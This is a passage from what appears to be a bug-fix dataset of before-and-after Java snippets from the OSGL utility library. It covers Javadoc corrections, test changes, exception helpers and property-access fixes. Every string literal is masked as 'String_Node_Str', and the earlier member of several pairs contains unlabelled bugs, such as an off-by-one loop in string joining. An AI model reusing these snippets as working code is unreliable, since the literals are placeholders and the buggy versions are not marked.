    if (!ignoreGlobalFilter && sourceKey instanceof String && OsglConfig.globalMappingFilter_shouldIgnore(sourceKey.toString())) {
      continue;
    }
    if (!semantic.allowTypeConvert() && !$.is(sourceKey).allowBoxing().instanceOf(targetKeyType)) {
      logError(""String_Node_Str"",targetKeyType,sourceKey.getClass().getName());
      continue;
    }
    Object sourceVal=sourceProperty.last().produce();
    if (null == sourceVal) {
      continue;
    }
    Object targetKey=specialMappingsReversed.get(sourceKey);
    if (null == targetKey) {
      targetKey=semantic.isMapping() ? convert(sourceKey,targetKeyType).to(targetKeyType) : sourceKey;
    }
    if (null != keyTransformer) {
      targetKey=keyTransformer.apply(targetKey);
    }
    String key=S.notBlank(prefix) ? S.pathConcat(prefix,'.',targetKey.toString()) : targetKey.toString();
    if (!filter.test(key)) {
      continue;
    }
    Object targetVal=adaptiveMap.getValue(targetKey.toString());
    if (null != keyTransformer) {
      targetKey=keyTransformer.apply(targetKey);
    }
    targetVal=prepareTargetComponent(sourceVal,targetVal,targetComponentRawType,targetComponentType,targetComponentIsContainer,""String_Node_Str"");
    adaptiveMap.putValue(targetKey.toString(),targetVal);
  }
}"
91514,"@Test public void deepCopyIgnoreError(){
  Foo source=foo1;
  Bar target=new Bar();
  $.deepCopy(source).keywordMatching().ignoreError().to(target);
  eq(source.id,target.id);
  eq(source.name,target.name);
  eq(source.ia,target.ia);
  eq(source.si,target.si);
  notSame(source.ia,target.ia);
  notNull(target.create_date);
  ne(source.createDate.getTime(),target.create_date.getMillis());
}","@Test public void deepCopyIgnoreError() throws Exception {
  Foo source=foo1;
  Thread.sleep(10);
  Bar target=new Bar();
  $.deepCopy(source).keywordMatching().ignoreError().to(target);
  eq(source.id,target.id);
  eq(source.name,target.name);
  eq(source.ia,target.ia);
  eq(source.si,target.si);
  notSame(source.ia,target.ia);
  notNull(target.create_date);
  ne(source.createDate.getTime(),target.create_date.getMillis());
}"
91515,"@Override public boolean equals(Object o){
  if (this == o)   return true;
  if (o == null || getClass() != o.getClass())   return false;
  Bean bean=(Bean)o;
  return Objects.equals(foo,bean.foo) && Objects.equals(map,bean.map);
}","@Override public boolean equals(Object o){
  if (this == o)   return true;
  if (o == null || getClass() != o.getClass())   return false;
  Bean bean=(Bean)o;
  return $.eq(foo,bean.foo) && $.eq(C.Map(map),C.Map(bean.map));
}"
91516,"@Test public void testMerge(){
  Foo source=foo1;
  Bar target=bar1;
  $.merge(source).to(target);
  eq(source.id,target.id);
  eq(source.name,target.name);
  eq(source.ia,target.ia);
  ne(source.si,target.si);
  isNull(target.create_date);
  yes(target.si.containsAll(source.si));
}","@Test public void testMerge() throws Exception {
  Foo source=foo1;
  Thread.sleep(10);
  Bar target=new Bar();
  $.merge(source).to(target);
  eq(source.id,target.id);
  eq(source.name,target.name);
  eq(source.ia,target.ia);
  ne(source.si,target.si);
  notNull(target.create_date);
  ne(source.createDate.getTime(),target.create_date.getMillis());
  yes(target.si.containsAll(source.si));
}"
91517,"public static void main(String[] args) throws Exception {
  args=new String[]{""String_Node_Str"",""String_Node_Str""};
  com.sun.tools.javadoc.Main.execute(args);
}","public static void main(String[] args) throws Exception {
  args=new String[]{""String_Node_Str"",""String_Node_Str""};
}"
91518,"/** 
 * Run reduction from head to tail. This is equivalent to <pre> if (isEmpty()) { return _.none(); } T result = head(); for (T element: this traversable.tail()) { result = accumulator.apply(result, element); } return _.some(result); </pre>
 * @param accumulator the function accumulate each element to the final result
 * @return an {@link $.Option} describing the accumulating result
 * @since 0.2
 */
$.Option<T> reduceLeft($.Func2<T,T,T> accumulator);","/** 
 * Run reduction from head to tail. This is equivalent to <pre> if (isEmpty()) { return _.none(); } T result = head(); for (T element: this traversable.tail()) { result = accumulator.apply(result, element); } return _.some(result); </pre>
 * @param accumulator the function accumulate each element to the final result
 * @return an {@link Osgl.Option} describing the accumulating result
 * @since 0.2
 */
$.Option<T> reduceLeft($.Func2<T,T,T> accumulator);"
91519,"/** 
 * Returns a   {@link $.Func2} function that takes two elements in the range domain and returns an integer todetermine the order of the two elements. See  {@link java.util.Comparator#compare(Object,Object)} forsemantic of the function. <p>If any one of the element applied is  {@code null} the function should throw out{@link NullPointerException}</p>
 * @return a function implement the ordering logic
 * @since 0.2
 */
Comparator<ELEMENT> order();","/** 
 * Returns a   {@link Osgl.Func2} function that takes two elements in the range domain and returns an integer todetermine the order of the two elements. See  {@link java.util.Comparator#compare(Object,Object)} forsemantic of the function. <p>If any one of the element applied is  {@code null} the function should throw out{@link NullPointerException}</p>
 * @return a function implement the ordering logic
 * @since 0.2
 */
Comparator<ELEMENT> order();"
91520,"/** 
 * Apply the predicate specified to the element of this sequence from head to tail. Stop at the element that returns   {@code true}, and returns an   {@link $.Option} describing the element. If noneof the element applications in the sequence returns  {@code true}then   {@link $#none()} is returned
 * @param predicate the function map the element to Boolean
 * @return an option describe the first element matches thepredicate or  {@link $#none()}
 * @since 0.2
 */
$.Option<T> findFirst($.Function<? super T,Boolean> predicate);","/** 
 * Apply the predicate specified to the element of this sequence from head to tail. Stop at the element that returns   {@code true}, and returns an   {@link Osgl.Option} describing the element. If noneof the element applications in the sequence returns  {@code true}then   {@link Osgl#none()} is returned
 * @param predicate the function map the element to Boolean
 * @return an option describe the first element matches thepredicate or  {@link Osgl#none()}
 * @since 0.2
 */
$.Option<T> findFirst($.Function<? super T,Boolean> predicate);"
91521,"/** 
 * Split this list into two list based on the predicate specified. <p> The function use the predicate to test all elements in this list. If test passed then it add the element into   {@link $.T2#_1 left side list}, otherwise the element will be added into   {@link $.T2#_2 right side list}. The result is returned as a   {@link org.osgl.Osgl.Tuple tuple} contains the left andright side lift </p>
 * @param predicate the function to test the elements in this list
 * @return a tuple of two lists
 */
$.T2<List<T>,List<T>> split($.Function<? super T,Boolean> predicate);","/** 
 * Split this list into two list based on the predicate specified. <p> The function use the predicate to test all elements in this list. If test passed then it add the element into   {@link Osgl.T2#_1 left side list}, otherwise the element will be added into   {@link Osgl.T2#_2 right side list}. The result is returned as a   {@link org.osgl.Osgl.Tuple tuple} contains the left andright side lift </p>
 * @param predicate the function to test the elements in this list
 * @return a tuple of two lists
 */
$.T2<List<T>,List<T>> split($.Function<? super T,Boolean> predicate);"
91522,"/** 
 * Returns an element that matches the predicate specified. The interface does not indicate if it should be the first element matches the predicate be returned or in case of parallel computing, whatever element matches found first is returned. It's all up to the implementation to refine the semantic of this method
 * @param predicate the function map element to Boolean
 * @return an element in this traversal that matches the predicate or{@link $#NONE} if no element matches
 * @since 0.2
 */
$.Option<T> findOne($.Function<? super T,Boolean> predicate);","/** 
 * Returns an element that matches the predicate specified. The interface does not indicate if it should be the first element matches the predicate be returned or in case of parallel computing, whatever element matches found first is returned. It's all up to the implementation to refine the semantic of this method
 * @param predicate the function map element to Boolean
 * @return an element in this traversal that matches the predicate or{@link Osgl#NONE} if no element matches
 * @since 0.2
 */
$.Option<T> findOne($.Function<? super T,Boolean> predicate);"
91523,"/** 
 * Returns a   {@link $.Func2} function that applied to an element in this {@code Range} andan integer  {@code n} indicate the number of steps. The result of the function is an element inthe range or the range domain after moving  {@code n} steps based on the element.<p>If the element apply is  {@code null}, the function should throw out  {@link NullPointerException}; if the resulting element is not defined in the range domain, the function should throw out   {@link NoSuchElementException}</p>
 * @return a function implement the stepping logic
 * @since 0.2
 */
$.Func2<ELEMENT,Integer,ELEMENT> step();","/** 
 * Returns a   {@link Osgl.Func2} function that applied to an element in this {@code Range} andan integer  {@code n} indicate the number of steps. The result of the function is an element inthe range or the range domain after moving  {@code n} steps based on the element.<p>If the element apply is  {@code null}, the function should throw out  {@link NullPointerException}; if the resulting element is not defined in the range domain, the function should throw out   {@link NoSuchElementException}</p>
 * @return a function implement the stepping logic
 * @since 0.2
 */
$.Func2<ELEMENT,Integer,ELEMENT> step();"
91524,"/** 
 * If there are still elements, then return the an option describing the next element, otherwise return   {@link $.Option#NONE}
 * @return either next element or none if no element in the iterator
 */
protected abstract $.Option<T> getCurrent();","/** 
 * If there are still elements, then return the an option describing the next element, otherwise return   {@link Osgl.Option#NONE}
 * @return either next element or none if no element in the iterator
 */
protected abstract $.Option<T> getCurrent();"
91525,"/** 
 * Iterate through the traversal to apply the accumulator to the result of previous application and the element being iterated. If the traversal is empty then return   {@link $.Option#NONE}, otherwise an   {@link $.Option} wrapping the accumulated resultis returned
 * @param accumulator the function the combine two values
 * @return {@code _.NONE} if the traversal is empty or an option describingthe final accumulated value
 */
@Override public $.Option<T> reduce($.Func2<T,T,T> accumulator){
  Iterator<T> itr=iterator();
  if (!itr.hasNext()) {
    return $.none();
  }
  T ret=itr.next();
  while (itr.hasNext()) {
    ret=accumulator.apply(ret,itr.next());
  }
  return $.some(ret);
}","/** 
 * Iterate through the traversal to apply the accumulator to the result of previous application and the element being iterated. If the traversal is empty then return   {@link Osgl.Option#NONE}, otherwise an   {@link Osgl.Option} wrapping the accumulated resultis returned
 * @param accumulator the function the combine two values
 * @return {@code _.NONE} if the traversal is empty or an option describingthe final accumulated value
 */
@Override public $.Option<T> reduce($.Func2<T,T,T> accumulator){
  Iterator<T> itr=iterator();
  if (!itr.hasNext()) {
    return $.none();
  }
  T ret=itr.next();
  while (itr.hasNext()) {
    ret=accumulator.apply(ret,itr.next());
  }
  return $.some(ret);
}"
91526,"/** 
 * Sub class can override this method to provide more efficient algorithm to generate hash code. The default implementation use  {@link $#iterableHashCode(Iterable)} to generate the hash code
 * @return hash code of this traversal
 */
protected int generateHashCode(){
  return $.iterableHashCode(this);
}","/** 
 * Sub class can override this method to provide more efficient algorithm to generate hash code. The default implementation use  {@link Osgl#iterableHashCode(Iterable)} to generate the hash code
 * @return hash code of this traversal
 */
protected int generateHashCode(){
  return $.iterableHashCode(this);
}"
91527,"/** 
 * Iterate the traversal to check if any element applied to the predicate the iteration process stop when the element is found and return an option describing the element. If no element applied to the predicate then   {@link $.Option#NONE} is returned
 * @param predicate the function map element to Boolean
 * @return an option describing the element match the predicate or noneif no such element found in the traversal
 */
@Override public $.Option<T> findOne($.Function<? super T,Boolean> predicate){
  for (  T t : this) {
    if (predicate.apply(t)) {
      return $.some(t);
    }
  }
  return $.none();
}","/** 
 * Iterate the traversal to check if any element applied to the predicate the iteration process stop when the element is found and return an option describing the element. If no element applied to the predicate then   {@link Osgl.Option#NONE} is returned
 * @param predicate the function map element to Boolean
 * @return an option describing the element match the predicate or noneif no such element found in the traversal
 */
@Override public $.Option<T> findOne($.Function<? super T,Boolean> predicate){
  for (  T t : this) {
    if (predicate.apply(t)) {
      return $.some(t);
    }
  }
  return $.none();
}"
91528,"@Test public void testInvokeMethodThrowsOutException(){
  try {
    $.invokeVirtual(new Foo(),""String_Node_Str"",1,2);
    fail(""String_Node_Str"");
  }
 catch (  UnexpectedMethodInvocationException e) {
    yes(e.getCause() instanceof IllegalArgumentException);
  }
}","@Test public void testInvokeMethodThrowsOutException(){
  try {
    $.invokeVirtual(new Foo(),""String_Node_Str"",1,2);
    fail(""String_Node_Str"");
  }
 catch (  IllegalArgumentException e) {
  }
}"
91529,"/** 
 * Join a string for n times
 * @param s     the string to be joined
 * @param times the times the string to be joined
 * @return the result
 */
public static String join(String s,int times){
  E.illegalArgumentIf(times < 0,""String_Node_Str"");
switch (times) {
case 0:
    return ""String_Node_Str"";
case 1:
  return s;
default :
int slen=s.length();
int len=slen * times;
StringBuilder sb=len > 100 ? builder() : newSizedBuilder(len);
for (int i=1; i < times; ++i) {
sb.append(s);
}
return sb.toString();
}
}","/** 
 * Join a string for n times
 * @param s     the string to be joined
 * @param times the times the string to be joined
 * @return the result
 */
public static String join(String s,int times){
  E.illegalArgumentIf(times < 0,""String_Node_Str"");
switch (times) {
case 0:
    return ""String_Node_Str"";
case 1:
  return s;
default :
int slen=s.length();
int len=slen * times;
StringBuilder sb=len > 100 ? builder() : newSizedBuilder(len);
for (int i=0; i < times; ++i) {
sb.append(s);
}
return sb.toString();
}
}"
91530,"/** 
 * Return an item from the cache service by key
 * @param key the cache key
 * @return the value associated with the key
 */
<T>T get(String key);","/** 
 * Return an item from the cache service by key
 * @param key the cache key
 * @param < T > the generic type of the return value
 * @return the value associated with the key
 */
<T>T get(String key);"
91531,"/** 
 * Returns a new character sequence that is a subsequence of this sequence. <p> An invocation of this method of the form <pre>  {@code sb.subSequence(begin,&nbsp;end)}</pre> behaves in exactly the same way as the invocation <pre>  {@code sb.substring(begin,&nbsp;end)}</pre> This method is provided so that this class can implement the   {@link CharSequence} interface.
 * @param start   the start index, inclusive.
 * @param end     the end index, exclusive.
 * @return     the specified subsequence.
 * @throws IndexOutOfBoundsException if  {@code start} or {@code end} are negative,if  {@code end} is greater than {@code length()}, or if   {@code start} is greater than {@code end}
 * @spec JSR-51
 */
@Override public CharSequence subSequence(int start,int end){
  return substring(start,end);
}","/** 
 * Returns a new character sequence that is a subsequence of this sequence. <p> An invocation of this method of the form <pre>  {@code sb.subSequence(begin,&nbsp;end)}</pre> behaves in exactly the same way as the invocation <pre>  {@code sb.substring(begin,&nbsp;end)}</pre> This method is provided so that this class can implement the   {@link CharSequence} interface.
 * @param start   the start index, inclusive.
 * @param end     the end index, exclusive.
 * @return     the specified subsequence.
 * @throws IndexOutOfBoundsException if  {@code start} or {@code end} are negative,if  {@code end} is greater than {@code length()}, or if   {@code start} is greater than {@code end}
 */
@Override public CharSequence subSequence(int start,int end){
  return substring(start,end);
}"
91532,"/** 
 * Set default ttl value which will be used if user pass 0 as ttl or not specified ttl Note some service might not favor this method after the internal cache service is initialized. E.g. memcached and ehcaches
 * @param ttl
 */
void setDefaultTTL(int ttl);","/** 
 * Set default ttl value which will be used if user pass 0 as ttl or not specified ttl Note some service might not favor this method after the internal cache service is initialized. E.g. memcached and ehcaches
 * @param ttl the default ttl value in seconds
 */
void setDefaultTTL(int ttl);"
91533,"/** 
 * Return an item from the cache service by key
 * @param key
 * @return the value associated with the key
 */
<T>T get(String key);","/** 
 * Return an item from the cache service by key
 * @param key the cache key
 * @return the value associated with the key
 */
<T>T get(String key);"
91534,"/** 
 * Store an item into the cache by key and use default ttl
 * @param key
 * @param value
 */
void put(String key,Object value);","/** 
 * Store an item into the cache by key and use default ttl
 * @param key the cache key
 * @param value the object to be cached
 */
void put(String key,Object value);"
91535,"/** 
 * Remove an item from the cache service by key
 * @param key
 */
void evict(String key);","/** 
 * Remove an item from the cache service by key
 * @param key the cache key
 */
void evict(String key);"
91536,"/** 
 * Construct a FastRuntimeException with cause, message and message arguments
 * @param cause
 * @param message
 * @param args
 */
public ConfigurationException(Throwable cause,String message,Object... args){
  super(cause,message,args);
}","public ConfigurationException(Throwable cause,String message,Object... args){
  super(cause,message,args);
}"
91537,"/** 
 * Construct a FastRuntimeException with cause, message and message arguments
 * @param cause
 * @param message
 * @param args
 */
public FastRuntimeException(Throwable cause,String message,Object... args){
  super(S.fmt(message,args),cause);
}","public FastRuntimeException(Throwable cause,String message,Object... args){
  super(S.fmt(message,args),cause);
}"
91538,"/** 
 * Convert to corresponding JDK exception. Warning, since there are synchronized method execution please beware of the performance issue when calling this method
 */
public IllegalArgumentException asJDKException(){
  IllegalArgumentException e=new IllegalArgumentException(getMessage()){
    @Override public synchronized Throwable fillInStackTrace(){
      return this;
    }
  }
;
  e.setStackTrace(getStackTrace());
  return e;
}","/** 
 * Convert to corresponding JDK exception. Warning, since there are synchronized method execution please beware of the performance issue when calling this method
 * @return the JDK {@link IllegalArgumentException} converted from this exception
 */
public IllegalArgumentException asJDKException(){
  IllegalArgumentException e=new IllegalArgumentException(getMessage()){
    @Override public synchronized Throwable fillInStackTrace(){
      return this;
    }
  }
;
  e.setStackTrace(getStackTrace());
  return e;
}"
91539,"/** 
 * Convert to corresponding JDK exception. Warning, since there are synchronized method execution please beware of the performance issue when calling this method
 */
public IndexOutOfBoundsException asJDKException(){
  IndexOutOfBoundsException e=new IndexOutOfBoundsException(getMessage()){
    @Override public synchronized Throwable fillInStackTrace(){
      return this;
    }
  }
;
  e.setStackTrace(getStackTrace());
  return e;
}","/** 
 * Convert to corresponding JDK exception. Warning, since there are synchronized method execution please beware of the performance issue when calling this method
 * @return the JDK {@link IndexOutOfBoundsException} converted from this excpetion instance
 */
public IndexOutOfBoundsException asJDKException(){
  IndexOutOfBoundsException e=new IndexOutOfBoundsException(getMessage()){
    @Override public synchronized Throwable fillInStackTrace(){
      return this;
    }
  }
;
  e.setStackTrace(getStackTrace());
  return e;
}"
91540,"/** 
 * Convert to corresponding JDK exception. Warning, since there are synchronized method execution please beware of the performance issue when calling this method
 */
public IllegalStateException asJDKException(){
  IllegalStateException e=new IllegalStateException(getMessage()){
    @Override public synchronized Throwable fillInStackTrace(){
      return this;
    }
  }
;
  e.setStackTrace(getStackTrace());
  return e;
}","/** 
 * Convert to corresponding JDK exception. Warning, since there are synchronized method execution please beware of the performance issue when calling this method
 * @return the JDK {@link IllegalStateException} corresponding to this exception instance
 */
public IllegalStateException asJDKException(){
  IllegalStateException e=new IllegalStateException(getMessage()){
    @Override public synchronized Throwable fillInStackTrace(){
      return this;
    }
  }
;
  e.setStackTrace(getStackTrace());
  return e;
}"
91541,"/** 
 * Construct a FastRuntimeException with cause, message and message arguments
 * @param cause
 * @param message
 * @param args
 */
public UnexpectedException(Throwable cause,String message,Object... args){
  super(S.fmt(message,args),cause);
}","public UnexpectedException(Throwable cause,String message,Object... args){
  super(S.fmt(message,args),cause);
}"
91542,"/** 
 * Convert to corresponding JDK exception. Warning, since there are synchronized method execution please beware of the performance issue when calling this method
 */
public UnsupportedOperationException asJDKException(){
  UnsupportedOperationException e=new UnsupportedOperationException(getMessage()){
    @Override public synchronized Throwable fillInStackTrace(){
      return this;
    }
  }
;
  e.setStackTrace(getStackTrace());
  return e;
}","/** 
 * Convert to corresponding JDK exception. Warning, since there are synchronized method execution please beware of the performance issue when calling this method
 * @return The JDK {@link UnsupportedOperationException} convert from this exception instance
 */
public UnsupportedOperationException asJDKException(){
  UnsupportedOperationException e=new UnsupportedOperationException(getMessage()){
    @Override public synchronized Throwable fillInStackTrace(){
      return this;
    }
  }
;
  e.setStackTrace(getStackTrace());
  return e;
}"
91543,"/** 
 * {@inheritDoc}This method does not specify the approach to run reduction. For a guaranteed reduction from head to tail, use  {@link #reduceLeft($.Func2)} instead
 * @param accumulator {@inheritDoc}
 * @return {@inheritDoc}
 * @since 0.2
 */
@Override $.Option<T> reduce($.Func2<T,T,T> accumulator);","/** 
 * {@inheritDoc}This method does not specify the approach to run reduction. For a guaranteed reduction from head to tail, use  {@link #reduceLeft(Osgl.Func2)} instead
 * @param accumulator {@inheritDoc}
 * @return {@inheritDoc}
 * @since 0.2
 */
@Override $.Option<T> reduce($.Func2<T,T,T> accumulator);"
91544,"/** 
 * Encrypt a string content using private key specified along with salt
 * @param content the content to be encrypted
 * @param privateKey the key to encrypt the content
 * @param salt the salt string
 * @return the encrypted content
 */
String encrypt(String content,byte[] privateKey,byte[] salt) throws Exception ;","/** 
 * Encrypt a string content using private key specified along with salt
 * @param content the content to be encrypted
 * @param privateKey the key to encrypt the content
 * @param salt the salt string
 * @return the encrypted content
 * @throws Exception when any exception happened
 */
String encrypt(String content,byte[] privateKey,byte[] salt) throws Exception ;"
91545,"/** 
 * Decrypt a secret using the private key specified along with the salt
 * @param secret the encrypted content
 * @param privateKey the key to decrypt the secret
 * @param salt the salt string
 * @return the original content
 */
String decrypt(String secret,byte[] privateKey,byte[] salt) throws Exception ;","/** 
 * Decrypt a secret using the private key specified along with the salt
 * @param secret the encrypted content
 * @param privateKey the key to decrypt the secret
 * @param salt the salt string
 * @return the original content
 * @throws Exception when any exception happened
 */
String decrypt(String secret,byte[] privateKey,byte[] salt) throws Exception ;"
91546,"/** 
 * Throw out   {@link org.osgl.exception.UnexpectedException}
 * @param cause 
 * @param msg the message template
 * @param args the message arguments
 */
public static UnexpectedException unexpected(Throwable cause,String msg,Object... args){
  throw new UnexpectedException(cause,msg,args);
}","public static UnexpectedException unexpected(Throwable cause,String msg,Object... args){
  throw new UnexpectedException(cause,msg,args);
}"
91547,"/** 
 * Throw out   {@link org.osgl.exception.UnexpectedEncodingException}
 * @param cause the UnsupportedEncodingException caused this unexpected encoding issue
 */
public static UnexpectedEncodingException encodingException(UnsupportedEncodingException cause){
  throw new UnexpectedEncodingException(cause);
}","public static UnexpectedEncodingException encodingException(UnsupportedEncodingException cause){
  throw new UnexpectedEncodingException(cause);
}"
91548,"/** 
 * throw out   {@link IllegalStateException}
 * @param msg message template
 * @param args message arguments
 */
public static InvalidStateException invalidState(String msg,Object... args){
  throw new InvalidStateException(S.fmt(msg,args));
}","public static InvalidStateException invalidState(String msg,Object... args){
  throw new InvalidStateException(S.fmt(msg,args));
}"
91549,"/** 
 * Wrapper of   {@link String#intern()}
 * @return
 */
@Override public String intern(){
  return toString().intern();
}","/** 
 * Wrapper of   {@link String#intern()}
 * @return the intern of the string
 */
@Override public String intern(){
  return toString().intern();
}"
91550,"private static List<Class<?>> findPropertyParameterizedType(Object entity,String prop){
  Class<?> c=entity.getClass();
  while (null != c && !Object.class.equals(c)) {
    try {
      String p=S.capFirst(prop);
      String getter=""String_Node_Str"" + p;
      Method m=c.getDeclaredMethod(getter);
      m.setAccessible(true);
      Type type=m.getGenericReturnType();
      if (type instanceof ParameterizedType) {
        ParameterizedType ptype=cast(type);
        return findArgumentTypes(ptype);
      }
 else {
        return null;
      }
    }
 catch (    NoSuchMethodException e) {
      try {
        Method m=c.getDeclaredMethod(prop);
        m.setAccessible(true);
        Type type=m.getGenericReturnType();
        if (type instanceof ParameterizedType) {
          ParameterizedType ptype=cast(type);
          return findArgumentTypes(ptype);
        }
      }
 catch (      NoSuchMethodException e1) {
        try {
          Field f=c.getDeclaredField(prop);
          f.setAccessible(true);
          Type type=f.getGenericType();
          if (type instanceof ParameterizedType) {
            ParameterizedType ptype=cast(type);
            return findArgumentTypes(ptype);
          }
        }
 catch (        NoSuchFieldException e2) {
          c=c.getSuperclass();
        }
      }
    }
  }
  throw E.unexpected(""String_Node_Str"",prop,entity.getClass());
}","private static List<Class<?>> findPropertyParameterizedType(Object entity,String prop){
  Class<?> c=entity.getClass();
  while (null != c && !Object.class.equals(c)) {
    try {
      String p=S.capFirst(prop);
      String getter=""String_Node_Str"" + p;
      Method m=findPropertyMethod(c,getter);
      m.setAccessible(true);
      Type type=m.getGenericReturnType();
      if (type instanceof ParameterizedType) {
        ParameterizedType ptype=cast(type);
        return findArgumentTypes(ptype);
      }
 else {
        return null;
      }
    }
 catch (    NoSuchMethodException e) {
      try {
        Method m=findPropertyMethod(c,prop);
        m.setAccessible(true);
        Type type=m.getGenericReturnType();
        if (type instanceof ParameterizedType) {
          ParameterizedType ptype=cast(type);
          return findArgumentTypes(ptype);
        }
      }
 catch (      NoSuchMethodException e1) {
        try {
          Field f=findPropertyField(c,prop);
          f.setAccessible(true);
          Type type=f.getGenericType();
          if (type instanceof ParameterizedType) {
            ParameterizedType ptype=cast(type);
            return findArgumentTypes(ptype);
          }
        }
 catch (        NoSuchFieldException e2) {
          c=c.getSuperclass();
        }
      }
    }
  }
  return null;
}"
91551,"private static <T>T getProperty(CacheService cache,Object entity,String... propertyPath){
  if (null == entity) {
    return null;
  }
  int len=propertyPath.length;
  E.illegalArgumentIf(len < 1);
  Object lastEntity=null;
  for (int i=0; i < len; ++i) {
    String prop=propertyPath[i];
    String lastProp=i == 0 ? prop : propertyPath[i - 1];
    if (entity instanceof List) {
      List<Class<?>> classList=findPropertyParameterizedType(lastEntity,lastProp);
      ListPropertyGetter getter=propertyHandlerFactory.createListPropertyGetter(classList.get(0));
      lastEntity=entity;
      entity=getter.get(lastEntity,prop);
    }
 else     if (entity instanceof Map) {
      List<Class<?>> classList=findPropertyParameterizedType(lastEntity,lastProp);
      if (null == classList) {
        PropertyGetter getter=propertyGetter(cache,entity,prop,false);
        lastEntity=entity;
        entity=getter.get(entity,null);
      }
 else {
        MapPropertyGetter getter=propertyHandlerFactory.createMapPropertyGetter(classList.get(0),classList.get(1));
        lastEntity=entity;
        entity=getter.get(lastEntity,prop);
      }
    }
 else {
      PropertyGetter getter=propertyGetter(cache,entity,prop,false);
      lastEntity=entity;
      entity=getter.get(entity,null);
    }
    if (null == entity) {
      return null;
    }
  }
  return (T)entity;
}","private static <T>T getProperty(CacheService cache,Object entity,String... propertyPath){
  if (null == entity) {
    return null;
  }
  int len=propertyPath.length;
  E.illegalArgumentIf(len < 1);
  Object lastEntity=null;
  for (int i=0; i < len; ++i) {
    String prop=propertyPath[i];
    String lastProp=i == 0 ? prop : propertyPath[i - 1];
    if (entity instanceof ValueObject) {
      ValueObject vo=(ValueObject)entity;
      if (vo.isUDF()) {
        entity=vo.value();
      }
    }
    if (entity instanceof List) {
      List<Class<?>> classList=findPropertyParameterizedType(lastEntity,lastProp);
      ListPropertyGetter getter=propertyHandlerFactory.createListPropertyGetter(classList.get(0));
      lastEntity=entity;
      entity=getter.get(lastEntity,prop);
    }
 else     if (entity instanceof Map) {
      List<Class<?>> classList=findPropertyParameterizedType(lastEntity,lastProp);
      if (null == classList) {
        PropertyGetter getter=propertyGetter(cache,entity,prop,false);
        lastEntity=entity;
        entity=getter.get(entity,prop);
      }
 else {
        MapPropertyGetter getter=propertyHandlerFactory.createMapPropertyGetter(classList.get(0),classList.get(1));
        lastEntity=entity;
        entity=getter.get(lastEntity,prop);
      }
    }
 else {
      PropertyGetter getter=propertyGetter(cache,entity,prop,false);
      lastEntity=entity;
      entity=getter.get(entity,null);
    }
    if (null == entity) {
      return null;
    }
  }
  return (T)entity;
}"
91552,"@Override public T resolve(String value){
  return func.apply(value);
}","@Override public FastStr resolve(String value){
  if (null == value) {
    return null;
  }
  return FastStr.of(value);
}"
91553,"@param @param private static Character resolveChar(String value,Character defVal){
  if (null == value) {
    return defVal;
  }
switch (value.length()) {
case 0:
    return defVal;
case 1:
  return value.charAt(0);
default :
if (value.startsWith(""String_Node_Str"")) {
  if (value.length() == 2) {
    Character c=PREDEFINED_CHARS.get(value);
    if (null != c) {
      return c;
    }
  }
  try {
    String s=value.substring(1);
    if (s.startsWith(""String_Node_Str"")) {
      int i=Integer.parseInt(s.substring(1),16);
      if (i > Character.MAX_VALUE || i < Character.MIN_VALUE) {
        throw new IllegalArgumentException(""String_Node_Str"" + value);
      }
      return (char)i;
    }
 else     if (s.length() > 3) {
      throw new IllegalArgumentException(""String_Node_Str"" + value);
    }
 else {
      if (s.length() == 3) {
        int i=Integer.parseInt(s.substring(0,1));
        if (i > 3) {
          throw new IllegalArgumentException(""String_Node_Str"" + value);
        }
      }
      int i=Integer.parseInt(s,8);
      return (char)i;
    }
  }
 catch (  NumberFormatException e) {
    throw new IllegalArgumentException(""String_Node_Str"" + value);
  }
}
 else {
  throw new IllegalArgumentException(""String_Node_Str"" + value);
}
}
}","/** 
 * Parsing String into char. The rules are: 1. if there value is null or empty length String then return `defval` specified 2. if the length of the String is `1`, then return that one char in the string 3. if the value not starts with '\', then throw `IllegalArgumentException` 4. if the value starts with `\\u` then parse the integer using `16` radix. The check the range, if it fall into Character range, then return that number, otherwise raise `IllegalArgumentException` 5. if the value length is 2 then check if it one of   {@link #PREDEFINED_CHARS}, if found then return 6. check if it valid OctalEscape defined in the <a href=""https://docs.oracle.com/javase/specs/jls/se7/html/jls-3.html#jls-3.10.6"">spec</a> if pass the check then return that char 7. all other cases throw `IllegalArgumentException`
 * @param value
 * @param defVal
 * @return
 */
private static Character resolveChar(String value,Character defVal){
  if (null == value) {
    return defVal;
  }
switch (value.length()) {
case 0:
    return defVal;
case 1:
  return value.charAt(0);
default :
if (value.startsWith(""String_Node_Str"")) {
  if (value.length() == 2) {
    Character c=PREDEFINED_CHARS.get(value);
    if (null != c) {
      return c;
    }
  }
  try {
    String s=value.substring(1);
    if (s.startsWith(""String_Node_Str"")) {
      int i=Integer.parseInt(s.substring(1),16);
      if (i > Character.MAX_VALUE || i < Character.MIN_VALUE) {
        throw new IllegalArgumentException(""String_Node_Str"" + value);
      }
      return (char)i;
    }
 else     if (s.length() > 3) {
      throw new IllegalArgumentException(""String_Node_Str"" + value);
    }
 else {
      if (s.length() == 3) {
        int i=Integer.parseInt(s.substring(0,1));
        if (i > 3) {
          throw new IllegalArgumentException(""String_Node_Str"" + value);
        }
      }
      int i=Integer.parseInt(s,8);
      return (char)i;
    }
  }
 catch (  NumberFormatException e) {
    throw new IllegalArgumentException(""String_Node_Str"" + value);
  }
}
 else {
  throw new IllegalArgumentException(""String_Node_Str"" + value);
}
}
}"
91554,"private PropertyGetter getterViaField(Class entityClass,String propName){
  while (!Object.class.equals(entityClass)) {
    try {
      Field f=entityClass.getDeclaredField(propName);
      f.setAccessible(true);
      return newGetter(entityClass,null,f);
    }
 catch (    NoSuchFieldException e3) {
      entityClass=entityClass.getSuperclass();
      throw E.unexpected(e3,""String_Node_Str"",propName,entityClass);
    }
  }
  throw E.unexpected(""String_Node_Str"");
}","private PropertyGetter getterViaField(Class entityClass,String propName){
  while (!Object.class.equals(entityClass)) {
    try {
      Field f=entityClass.getDeclaredField(propName);
      f.setAccessible(true);
      return newGetter(entityClass,null,f);
    }
 catch (    NoSuchFieldException e3) {
      entityClass=entityClass.getSuperclass();
    }
  }
  throw E.unexpected(""String_Node_Str"",propName,entityClass);
}"
91555,"@Override public PropertySetter createPropertySetter(Class c,String propName){
  String p=S.capFirst(propName);
  String setter=""String_Node_Str"" + p;
  String isser=""String_Node_Str"" + p;
  Method[] ma=c.getMethods();
  for (  Method m : ma) {
    String mn=m.getName();
    if (S.neq(setter,mn) && S.neq(isser,mn) && S.neq(p,mn)) {
      continue;
    }
    Class[] ca=m.getParameterTypes();
    if (ca != null && ca.length == 1) {
      return newSetter(c,m,null);
    }
  }
  try {
